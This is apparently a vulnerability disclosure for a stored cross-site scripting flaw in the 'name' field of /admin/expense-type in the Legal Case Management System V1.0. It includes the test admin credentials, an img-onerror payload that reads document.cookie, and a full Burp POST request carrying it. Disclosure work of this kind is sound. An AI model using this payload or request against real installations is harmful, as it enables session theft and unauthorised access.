## Legal Case Management System

## XSS on `/admin/expense-type`

### Vendor Homepage:

```
https://www.campcodes.com/projects/php/legal-case-management-system/
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://192.168.150.131/admin/login
superadmin@gmail.com
12345678Ab@
```

### Affected Page:

```
/admin/expense-type
```

The parameter `name` is being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

### Proof of Concept:

Payload:

```
<img src=1 onerror="alert(document.cookie)">
```

Burp Request:

```
POST /admin/expense-type HTTP/1.1
Host: 192.168.150.131
Content-Length: 411
Accept: */*
DNT: 1
X-CSRF-TOKEN: ULMyHyzFjMsFtMuhHe7fZNzX3Wzq3QzrNCAeTRLy
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9vkEfxewu5x2mwFG
Origin: http://192.168.150.131
Referer: http://192.168.150.131/admin/expense-type
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: XSRF-TOKEN=eyJpdiI6InJZWUJDQVg2aUJDb0JNRmZuRWFTdkE9PSIsInZhbHVlIjoiOVVTZGtCYmdBZnVidVpMU1RGcFRITjBqTXk1b3pHc3lnZUtYVHVYdWNhMkg4ejZ3dE94S2d5WkNWOVwvaWxVa2kiLCJtYWMiOiI0Y2U5NmExODczNGQxMWU2ZDU5Y2E1NzFjZmZjOTMwOWExMzNiNDRkMmNiNjU1ZDBjYTU3ZTVmMDQxNDFiMTE1In0%3D; test_session=eyJpdiI6IjVOd3lMbEplSFhSZytaSXZScDN3Y1E9PSIsInZhbHVlIjoiWWQwVWNPYzBxU09qdWlpaVNxRjBCYThzejF4U2FENGhIQzJVMkVtV09RNlFJdVZSYjBXaVFIZWZsVUdIUk9UTyIsIm1hYyI6IjIzMTYzZWJiNzA3NmE0OWNiNGFkMjhiOTU5MWYwZTg0YTM4MDIzMjkxOWE1MDkwOTFlM2NmMzFmNjM3NjMxMmQifQ%3D%3D
Connection: close

------WebKitFormBoundary9vkEfxewu5x2mwFG
Content-Disposition: form-data; name="_token"

ULMyHyzFjMsFtMuhHe7fZNzX3Wzq3QzrNCAeTRLy
------WebKitFormBoundary9vkEfxewu5x2mwFG
Content-Disposition: form-data; name="name"

<img src=1 onerror="alert(document.cookie)">
------WebKitFormBoundary9vkEfxewu5x2mwFG
Content-Disposition: form-data; name="description"

2
------WebKitFormBoundary9vkEfxewu5x2mwFG--

```

### Screenshot

![image-20240509195545571](./screenshot/image-20240509195545571.png)
